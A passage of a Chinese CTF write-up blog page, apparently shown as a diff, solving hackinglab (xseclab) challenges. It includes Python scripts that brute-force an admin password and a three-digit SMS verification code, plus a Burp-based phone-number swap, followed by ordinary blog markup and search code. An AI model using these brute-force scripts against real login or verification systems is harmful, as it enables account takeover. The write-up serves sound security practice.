class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/kZEqUM7.png" alt=""></p>
+<h1 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a><a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/" title="逗比的手机验证码" target="_blank" rel="noopener">逗比的手机验证码</a></h1><p>获取验证码后提交，发现需要以13388886667提交，<br>那么：获取验证码，提交，bp抓到，改手机号，提交即可</p>
+<h1 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" title="基情燃烧的岁月" target="_blank" rel="noopener">基情燃烧的岁月</a></h1><p>先爆破验证码：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'vcode'</span>: num, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find vcode! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/WCRcYrG.png" alt=""><br>换手机号13399999999继续爆破：<br><img src="https://i.imgur.com/j74pYVA.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/uploads/images/wechatQR_2.JPG" alt="AbelChe wechat" style="width: 200px; max-width: 100%;"/>
+    <div>扫码加微信</div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Donate here!!!</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="AbelChe 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="AbelChe 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    AbelChe
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/" title="WP-hackinglab 脚本关（py脚本）">http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/py脚本/" rel="tag"># py脚本</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/22/Git基本命令/" rel="next" title="Git基本命令">
+                <i class="fa fa-chevron-left"></i> Git基本命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/images/head.png"
+                alt="AbelChe" />
+            
+              <p class="site-author-name" itemprop="name">AbelChe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/AbelChe" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://coding.net/u/AbelChe" target="_blank" title="Coding">
+                      
+                        <i class="fa fa-fw fa-bullseye"></i>Coding</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.aliyun.com" target="_blank" title="Aliyun">
+                      
+                        <i class="fa fa-fw fa-cloud"></i>Aliyun</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://mail.qq.com" target="_blank" title="QQ_mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>QQ_mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://mail.google.com/mail/" target="_blank" title="Gmail">
+                      
+                        <i class="fa fa-fw fa-google"></i>Gmail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/AbelChe7" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                LINKS
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.baidu.com" title="Baidu" target="_blank">Baidu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.google.com" title="Google" target="_blank">Google</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.csdn.net" title="CSDN" target="_blank">CSDN</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bilibili.com" title="Bilibili" target="_blank">Bilibili</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.taobao.com" title="Taobao" target="_blank">Taobao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" title="Python Learning" target="_blank">Python Learning</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#key又又找不到了"><span class="nav-number">1.</span> <span class="nav-text">key又又找不到了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#快速口算"><span class="nav-number">2.</span> <span class="nav-text">快速口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这个题目是空的"><span class="nav-number">3.</span> <span class="nav-text">这个题目是空的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#怎么就是不弹出key呢？"><span class="nav-number">4.</span> <span class="nav-text">怎么就是不弹出key呢？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第一期"><span class="nav-number">5.</span> <span class="nav-text">逗比验证码第一期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比验证码第二期"><span class="nav-number">6.</span> <span class="nav-text">逗比验证码第二期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的验证码第三期（SESSION）"><span class="nav-number">7.</span> <span class="nav-text">逗比的验证码第三期（SESSION）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#逗比的手机验证码"><span class="nav-number">8.</span> <span class="nav-text">逗比的手机验证码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基情燃烧的岁月"><span class="nav-number">9.</span> <span class="nav-text">基情燃烧的岁月</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AbelChe</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">28.6k</span>
+  
+</div>
+
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+-->
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
